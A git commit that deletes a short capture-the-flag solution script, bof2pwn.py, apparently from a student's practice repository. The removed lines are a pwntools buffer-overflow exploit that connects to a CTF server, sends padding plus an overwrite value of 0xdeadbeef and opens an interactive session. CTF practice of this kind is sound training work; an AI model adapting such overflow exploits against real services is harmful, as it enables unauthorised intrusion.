223482183fc31f6e922a38de5f4cc27245cabe18
Austin Leach <austinleach850@gmail.com>
2024-01-17 14:07:42 -0500

    Delete CTF Solutions/bof2pwn.py

--- CTF Solutions/bof2pwn.py
+++
@@ -1,8 +0,0 @@
-from pwn import *
-io = remote("ctf.hackucf.org", 9001)
-
-payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa"
-payload += b"\xef\xbe\xad\xde"
-
-io.sendline(payload)
-io.interactive()
